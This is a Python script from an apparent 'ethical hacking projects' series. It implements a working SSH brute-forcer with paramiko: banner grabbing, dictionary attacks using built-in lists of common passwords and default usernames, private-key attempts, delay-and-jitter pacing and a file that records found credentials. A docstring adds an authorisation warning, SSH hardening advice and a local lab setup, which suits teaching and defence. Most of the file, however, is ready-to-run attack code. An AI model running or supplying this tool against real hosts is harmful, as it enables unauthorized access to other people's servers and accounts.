#!/usr/bin/env python3
"""
============================================================
  PROJECT #8 — SSH Brute Forcer (Paramiko)
  100 Ethical Hacking Projects Series
  Lib     : paramiko
  Features: banner grab, transport reuse, key auth, hit file
============================================================

  ╔══════════════════════════════════════════════════════╗
  ║          ⚠  ETHICAL USE WARNING  ⚠                  ║
  ║  Use ONLY on systems you own or have explicit        ║
  ║  written authorisation to test.                      ║
  ║  Legal: your own Ubuntu/WSL lab, HackTheBox,         ║
  ║  TryHackMe, signed pentest scope.                    ║
  ╚══════════════════════════════════════════════════════╝

DEFENSE AGAINST SSH BRUTE FORCE
---------------------------------
1. FAIL2BAN
   /etc/fail2ban/jail.d/sshd.conf:
     [sshd]
     enabled  = true
     maxretry = 3
     findtime = 60
     bantime  = 3600    # 1 hour; use -1 for permanent

2. SSHD_CONFIG HARDENING  (/etc/ssh/sshd_config)
     PasswordAuthentication no    # force key-only auth
     PermitRootLogin no
     MaxAuthTries 3               # kernel-level limit
     LoginGraceTime 20
     AllowUsers youruser          # whitelist

3. PORT KNOCKING / NON-STANDARD PORT
   Moving SSH to a high port (e.g. 2222) eliminates ~95%
   of automated internet scanners. Not security by obscurity
   alone — combined with fail2ban it's very effective.

4. KEY-BASED AUTH + DISABLE PASSWORDS
   The gold standard. No password = no dictionary attack.
   Generate: ssh-keygen -t ed25519
   Deploy:   ssh-copy-id user@host

5. CROWDSEC / SSHGUARD
   Modern fail2ban alternatives with threat-intelligence
   sharing — blocks known malicious IPs proactively.

LAB SETUP (Ubuntu / WSL)
--------------------------
  sudo apt install openssh-server
  sudo useradd -m labuser && echo "labuser:password123" | sudo chpasswd
  sudo service ssh start
  # Test: ssh labuser@127.0.0.1
  python3 project8_ssh_cracker.py --ip 127.0.0.1 --username labuser

USAGE
------
  python3 project8_ssh_cracker.py --ip 127.0.0.1 --username root
  python3 project8_ssh_cracker.py --ip 192.168.1.10 --userlist users.txt --passlist pass.txt
  python3 project8_ssh_cracker.py --ip 10.0.0.5 --username admin --key ~/.ssh/id_rsa
  python3 project8_ssh_cracker.py --ip 127.0.0.1 --banner-only
============================================================
"""

import argparse
import sys
import time
import os
import socket
import random
import datetime
import threading
import paramiko

# ── colours ───────────────────────────────────────────────
R="\033[0m";BOLD="\033[1m";RED="\033[91m";GREEN="\033[92m"
YELLOW="\033[93m";CYAN="\033[96m";MAGENTA="\033[95m";DIM="\033[2m"
def c(t, code): return f"{code}{t}{R}"

HIT_FILE = "ssh_hit.txt"
MAX_TRIES_PER_TRANSPORT = 3   # reconnect after this many attempts

# ── silence paramiko's own logging ───────────────────────
import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

# ── built-in wordlists ────────────────────────────────────
BUILTIN_PASSWORDS = [
    "", "password", "password1", "password123", "Password1",
    "pass", "pass123", "passw0rd", "p@ssword", "pass@123",
    "123456", "12345678", "123456789", "1234567890",
    "000000", "111111", "654321",
    "{user}", "{user}1", "{user}123", "{user}@123", "{user}2024",
    "admin", "admin123", "admin@123", "root", "root123", "toor",
    "test", "test123", "guest", "guest123", "user", "user123",
    "qwerty", "qwerty123", "1q2w3e", "1q2w3e4r",
    "abc123", "iloveyou", "changeme", "letmein",
    "welcome", "welcome1", "master", "dragon",
    "shadow", "sunshine", "monkey", "football",
    "superman", "batman", "trustno1", "secret", "secret123",
    "alpine", "cisco", "cisco123", "ubnt", "raspberry",
    "opensesame", "passpass", "login", "login123",
]

BUILTIN_USERS = [
    "root", "admin", "administrator", "ubuntu", "pi",
    "user", "test", "guest", "oracle", "postgres",
    "deploy", "git", "www-data", "vagrant", "ansible",
]

# ─────────────────────────────────────────────────────────
# BANNER GRAB
# ─────────────────────────────────────────────────────────
def grab_banner(host: str, port: int, timeout: float = 8.0) -> str | None:
    """
    Open raw TCP socket to SSH port and read the banner line.
    SSH servers send their version string immediately on connect
    before any authentication — e.g.:
        SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
    This reveals OS, OpenSSH version → informs CVE lookups.
    """
    try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((host, port))
        banner = s.recv(1024).decode(errors="replace").strip()
        s.close()
        return banner
    except Exception as e:
        return None

# ─────────────────────────────────────────────────────────
# TRANSPORT FACTORY — reuse for up to MAX_TRIES_PER_TRANSPORT
# ─────────────────────────────────────────────────────────
def new_transport(host: str, port: int, timeout: float) -> paramiko.Transport | None:
    """Open a new Paramiko Transport (TCP layer) to the SSH server."""
    try:
        transport = paramiko.Transport((host, port))
        transport.start_client(timeout=timeout)
        return transport
    except Exception:
        return None

def close_transport(transport):
    try:
        if transport and transport.is_active():
            transport.close()
    except Exception:
        pass

# ─────────────────────────────────────────────────────────
# SINGLE PASSWORD ATTEMPT (reusing existing transport)
# ─────────────────────────────────────────────────────────
def try_password(transport: paramiko.Transport,
                 username: str, password: str) -> tuple[bool, str]:
    """
    Attempt password auth on an existing transport.
    Returns (success, reason).
    """
    try:
        transport.auth_password(username, password)
        return True, "Authentication succeeded"
    except paramiko.AuthenticationException:
        return False, "Authentication failed"
    except paramiko.SSHException as e:
        return False, f"SSHException: {e}"
    except EOFError:
        return False, "Connection closed by server"
    except Exception as e:
        return False, str(e)

# ─────────────────────────────────────────────────────────
# KEY AUTH ATTEMPT
# ─────────────────────────────────────────────────────────
def try_key(host: str, port: int, username: str,
            key_path: str, timeout: float) -> tuple[bool, str]:
    """
    Attempt private-key authentication.
    Tries RSA, Ed25519, ECDSA, DSS key types.
    """
    loaders = [
        paramiko.RSAKey,
        paramiko.Ed25519Key,
        paramiko.ECDSAKey,
        paramiko.DSSKey,
    ]
    key = None
    for loader in loaders:
        try:
            key = loader.from_private_key_file(key_path)
            break
        except Exception:
            continue

    if key is None:
        return False, f"Could not load key from {key_path}"

    try:
        transport = paramiko.Transport((host, port))
        transport.start_client(timeout=timeout)
        transport.auth_publickey(username, key)
        close_transport(transport)
        return True, f"Key auth succeeded ({type(key).__name__})"
    except paramiko.AuthenticationException:
        return False, "Key auth failed"
    except Exception as e:
        return False, str(e)

# ─────────────────────────────────────────────────────────
# SAVE HIT
# ─────────────────────────────────────────────────────────
def save_hit(host: str, port: int, username: str,
             secret: str, method: str = "password"):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    content = (
        f"{'='*52}\n"
        f"SSH CREDENTIAL FOUND\n"
        f"Time    : {ts}\n"
        f"Host    : {host}:{port}\n"
        f"Method  : {method}\n"
        f"Username: {username}\n"
        f"Secret  : {secret}\n"
        f"{'='*52}\n"
    )
    with open(HIT_FILE, "a") as f:
        f.write(content)
    print(c(f"\n  ✔ Saved to {HIT_FILE}", GREEN))

def show_hit_file():
    if not os.path.exists(HIT_FILE):
        return
    print(c(f"\n  ── {HIT_FILE} ────────────────────────────────────────", CYAN))
    with open(HIT_FILE) as f:
        for line in f:
            print("  " + line.rstrip())

# ─────────────────────────────────────────────────────────
# MAIN CRACKER LOOP
# ─────────────────────────────────────────────────────────
def crack(host: str, port: int, usernames: list, passwords: list,
          delay: float, jitter: bool, timeout: float,
          stop_on_first: bool, key_path: str | None):

    total_combos = len(usernames) * len(passwords)
    hits         = []
    attempt_num  = 0
    t0           = time.time()

    print(c(f"\n  ── ATTACK ─────────────────────────────────────────────────", CYAN))
    print(f"  Target   : {c(host+':'+str(port), YELLOW)}")
    print(f"  Users    : {c(str(len(usernames)), MAGENTA)}   "
          f"Passwords: {c(str(len(passwords)), MAGENTA)}   "
          f"Combos: {c(str(total_combos), MAGENTA)}")
    print(f"  Delay    : {delay}s {'+ jitter' if jitter else ''}   "
          f"Reconnect every: {MAX_TRIES_PER_TRANSPORT} attempts")
    if key_path:
        print(f"  Key file : {c(key_path, MAGENTA)}")
    print()
    print(f"  {'ATTEMPT':<14}  {'USERNAME':<16}  {'PASSWORD':<22}  RESULT")
    print("  " + "─"*72)

    for username in usernames:
        transport   = None
        tries_this  = 0

        # ── optional key auth first ───────────────────────
        if key_path:
            ok, reason = try_key(host, port, username, key_path, timeout)
            attempt_num += 1
            tag = c("SUCCESS ✔", GREEN+BOLD) if ok else c("FAIL", DIM)
            print(f"  {c(f'[ATTEMPT {attempt_num:>4}]', CYAN)}  "
                  f"{c(f'{username:<16}', YELLOW if ok else R)}  "
                  f"{c(f'{key_path:<22}', GREEN if ok else MAGENTA)}  "
                  f"{tag}  {c('[KEY]  '+reason, DIM)}")
            if ok:
                hits.append((username, key_path, "key"))
                save_hit(host, port, username, key_path, "private_key")
                if stop_on_first:
                    break

        # ── password attack ───────────────────────────────
        for raw_pass in passwords:
            password    = raw_pass.replace("{user}", username)
            attempt_num += 1

            # delay
            if attempt_num > 1:
                wait = delay + (random.uniform(-0.15, 0.15) if jitter else 0)
                time.sleep(max(0.05, wait))

            # reconnect if needed
            if transport is None or not transport.is_active() \
                    or tries_this >= MAX_TRIES_PER_TRANSPORT:
                close_transport(transport)
                transport  = new_transport(host, port, timeout)
                tries_this = 0
                if transport is None:
                    print(c(f"  [!] Cannot connect to {host}:{port} — aborting.", RED))
                    goto_summary(hits, attempt_num, t0)
                    return

            ok, reason  = try_password(transport, username, password)
            tries_this += 1

            tag    = c("SUCCESS ✔", GREEN+BOLD) if ok else c("FAIL", DIM)
            u_disp = c(f"{username:<16}", YELLOW if ok else R)
            p_disp = c(f"{password:<22}", GREEN  if ok else MAGENTA)
            n_disp = c(f"[ATTEMPT {attempt_num:>4}]", CYAN)
            print(f"  {n_disp}  {u_disp}  {p_disp}  {tag}  {c(reason, DIM)}")

            if ok:
                hits.append((username, password, "password"))
                save_hit(host, port, username, password)
                close_transport(transport)
                if stop_on_first:
                    break

            # server closed transport after failed auth — rebuild next iter
            if not ok and not transport.is_active():
                transport  = None
                tries_this = 0

        close_transport(transport)
        if hits and stop_on_first:
            break

    goto_summary(hits, attempt_num, t0)


def goto_summary(hits, attempt_num, t0):
    elapsed = time.time() - t0
    print(c(f"\n  ── SUMMARY ────────────────────────────────────────────────", CYAN))
    print(f"  Attempts : {attempt_num}   Time: {elapsed:.1f}s   "
          f"Rate: {attempt_num/max(elapsed,0.01):.1f}/s")
    if hits:
        print(c(f"\n  ✔ FOUND {len(hits)} credential(s):", GREEN+BOLD))
        for u, s, m in hits:
            print(f"    {c(u, YELLOW)} : {c(s, GREEN)}  [{m}]")
        show_hit_file()
    else:
        print(c("\n  ✗ No credentials found in wordlist.", YELLOW))
        print(c("    Tips: larger wordlist, verify host/port, check SSH is running.", DIM))
    print()

# ─────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────
def load_list(path, label):
    try:
        with open(path) as f:
            items = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        print(c(f"  Loaded {len(items)} {label} from {path}", DIM))
        return items
    except FileNotFoundError:
        print(c(f"\n  [ERROR] Not found: {path}\n", RED))
        sys.exit(1)

# ─────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Project #8 — SSH Brute Forcer")
    parser.add_argument("--ip",          required=True)
    parser.add_argument("--port",        type=int,   default=22)
    # username
    grp = parser.add_mutually_exclusive_group()
    grp.add_argument("--username",       default=None)
    grp.add_argument("--userlist",       default=None)
    # password / key
    parser.add_argument("--passlist",    default=None)
    parser.add_argument("--key",         default=None,  help="Path to private key file")
    # behaviour
    parser.add_argument("--delay",       type=float, default=0.5)
    parser.add_argument("--jitter",      action="store_true")
    parser.add_argument("--timeout",     type=float, default=8.0)
    parser.add_argument("--no-stop",     action="store_true")
    parser.add_argument("--banner-only", action="store_true",
                        help="Grab SSH banner and exit (no attack)")
    args = parser.parse_args()

    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", CYAN))
    print(c("  ║   PROJECT #8 · SSH BRUTE FORCER  (Paramiko)          ║", CYAN))
    print(c("  ║   100 Ethical Hacking Projects Series                 ║", CYAN))
    print(c("  ╚══════════════════════════════════════════════════════╝", CYAN))
    print()
    print(c("  ⚠  Authorised targets only.", RED))

    # ── banner grab (always, or just print and exit) ──────
    print(c(f"\n  ── BANNER GRAB  {args.ip}:{args.port} ─────────────────────────", CYAN))
    banner = grab_banner(args.ip, args.port, args.timeout)
    if banner:
        print(f"  {c('Banner  :', DIM)} {c(banner, YELLOW)}")
        # parse software info
        parts = banner.split("-", 2)
        if len(parts) >= 3:
            sw = parts[2]
            print(f"  {c('Software:', DIM)} {c(sw, MAGENTA)}")
            if "OpenSSH" in sw:
                ver = sw.split("_")[1].split()[0] if "_" in sw else "?"
                print(f"  {c('OpenSSH version:', DIM)} {c(ver, CYAN)}")
                print(c("  Tip: search 'OpenSSH " + ver + " CVE' for known vulnerabilities.", DIM))
    else:
        print(c(f"  Could not reach {args.ip}:{args.port}", RED))
        if args.banner_only:
            sys.exit(1)

    if args.banner_only:
        print()
        return

    if not banner:
        print(c("  [!] No SSH service detected — aborting attack.\n", RED))
        sys.exit(1)

    # ── build lists ───────────────────────────────────────
    usernames = (load_list(args.userlist, "usernames") if args.userlist
                 else [args.username] if args.username
                 else BUILTIN_USERS)
    passwords = (load_list(args.passlist, "passwords") if args.passlist
                 else BUILTIN_PASSWORDS)

    crack(
        host         = args.ip,
        port         = args.port,
        usernames    = usernames,
        passwords    = passwords,
        delay        = args.delay,
        jitter       = args.jitter,
        timeout      = args.timeout,
        stop_on_first= not args.no_stop,
        key_path     = args.key,
    )


if __name__ == "__main__":
    main()